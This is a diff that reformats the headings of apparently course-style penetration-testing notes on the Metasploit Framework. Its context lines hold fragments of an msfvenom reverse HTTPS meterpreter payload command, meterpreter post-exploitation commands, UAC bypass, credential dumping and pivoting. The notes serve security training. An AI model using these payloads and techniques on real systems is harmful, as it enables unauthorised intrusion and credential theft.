@@ -1,8 +1,8 @@
 # Module 20: The Metasploit Framework
 
-Getting Familiar with Metasploit
+## Getting Familiar with Metasploit
 
-#### Setup and Work with MSF
+### Setup and Work with MSF
 
 Startin the database service and creating/initializing the MSF database:
 
@@ -122,7 +122,7 @@ msf6 > show -h
 ```
 {% endcode %}
 
-#### Auxiliary Modules
+### Auxiliary Modules
 
 Listing all auxiliary modules:
 
@@ -192,13 +192,13 @@ Timestamp                Host            Name                         References
 ```
 {% endcode %}
 
-#### Exploit Modules
+### Exploit Modules
 
 Same kind of deal as the Auxiliary modules except you want to pick an exploit and then set a payload.
 
-### Using Metasploit Payloads
+## Using Metasploit Payloads
 
-#### Staged vs Non-Staged Payloads
+### Staged vs Non-Staged Payloads
 
 _Non-staged_: Sent in its entirety along with the exploit. These are generally more stable. The downside is the size will be bigger than other types.
 
@@ -222,7 +222,7 @@ Compatible Payloads
 
 The two payloads above only differ in the character following **shell** before **reverse\_tcp**. The **/shell/reverse\_tcp** is a staged payload. The **/shell\_reverse\_tcp** is a non-staged payload.
 
-#### Meterpreter Payload
+### Meterpreter Payload
 
 The _Meterpreter_ payload is a multi-function payload that can be dynamically extended at run-time. It resides entirely in memory and communication is encrypted by default.
 
@@ -252,7 +252,7 @@ meterpreter > lpwd
 /home/kali/Downloads
 ```
 
-#### Executable Payloads
+### Executable Payloads
 
 Using msfvenom to list payloads with a filter:
 
@@ -273,9 +273,9 @@ kali@kali:~$ msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119
 ```
 {% endcode %}
 
-### Performing Post-Exploitation with Metasploit
+## Performing Post-Exploitation with Metasploit
 
-#### Core Meterpreter Post-Exploitation Features
+### Core Meterpreter Post-Exploitation Features
 
 ```bash
 meterpreter > idletime
@@ -315,7 +315,7 @@ meterpreter > migrate 2720
 meterpreter > 
 ```
 
-#### Post-Exploitation Modules
+### Post-Exploitation Modules
 
 Getting integrity level and bypassing UAC starting from Meterpreter session:
 
@@ -380,7 +380,7 @@ meterpreter > creds_msv
 
 ```
 
-#### Pivoting with Metasploit
+### Pivoting with Metasploit
 
 Setting up a route through an open session:
 
@@ -521,9 +521,9 @@ kali@kali:~$ sudo xfreerdp /v:127.0.0.1 /u:luiza
 ...
 ```
 
-### Automating Metasploit
+## Automating Metasploit
 
-#### Resource Scripts
+### Resource Scripts
 
 Creating a resource script to start a multi/handler listener for a non-staged Windows 64-bit Meterpreter payload:
 
